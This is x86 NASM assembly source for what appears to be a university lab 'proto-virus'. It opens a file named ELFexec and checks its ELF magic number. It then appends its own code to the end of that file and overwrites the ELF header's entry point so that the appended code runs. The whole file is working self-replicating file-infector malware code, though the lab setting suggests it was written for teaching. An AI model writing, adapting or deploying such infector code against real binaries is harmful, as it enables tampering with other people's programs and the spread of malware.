%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro blockSize 3
	mov %1,%3;
	sub %1,%2
%endmacro

%define STDOUT 1

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define	PHDR_vaddr	8
%define EHDR_size 52
%define magic_number 0x464c457f
%define new_entry_point 0x08048294
global _start

	section .text
_start:	
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;You code for this lab goes here
	;Print Hello Im a virus
	call get_my_loc
	sub ebx,next_i-OutStr
	write STDOUT,ebx,32
	;Try to open ELFexec
	call get_my_loc
	sub ebx,next_i-FileName
	open ebx,RDWR,0777
	mov [esp],eax ;put the fd in stack(pos=0)
	cmp dword[esp],0 ;check if open failed
	jl Error
	;Check if ELFexec is of ELF format
	mov ebx,[esp];move the fd to ebx
	add esp,4;move pos of stack after fd in stack(pos=4)
	read ebx,esp,4
	sub esp,4;return to top of stack (pos=0)
	cmp dword[esp+4], magic_number ;magic 
	jne Error
	;Write the virus to end of ELFexec
	mov eax,[esp];move the fd to eax
	lseek eax,0,SEEK_END
	mov ecx,_start
	blockSize ebx,_start,virus_end ;ebx will hold the size of start until the end
	mov eax,[esp];move the fd to eax
	write eax,ecx,ebx
	;Overwrite the entry point of ELFexec to the virus start
	mov ebx,[esp];move the fd to ebx
	lseek ebx,0,SEEK_SET;move to the beginning of the file
	mov ebx,[esp];move the fd to ebx
	add esp,8 ;move esp to (pos=8)
	read ebx,esp,EHDR_size;read to esp (pos=8) the elf header
	mov  dword[esp+ENTRY],new_entry_point;overwrite the entry point of ELFexec to the virus start
	lseek ebx,0,SEEK_SET;move to the beginning of the file
	mov ebx,[esp-8];move the fd to ebx (pos=0)
	write ebx,esp,EHDR_size
	sub esp,8;reset esp to top of stack(pos=0)
VirusExit:
	mov eax,[esp]
	close eax
    exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
Error:
	call get_my_loc
	sub ebx,next_i-Failstr
	write STDOUT,ebx,13
	exit 1
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
get_my_loc: 
	call next_i
next_i:
	pop ebx
	ret
PreviousEntryPoint: dd VirusExit
virus_end:


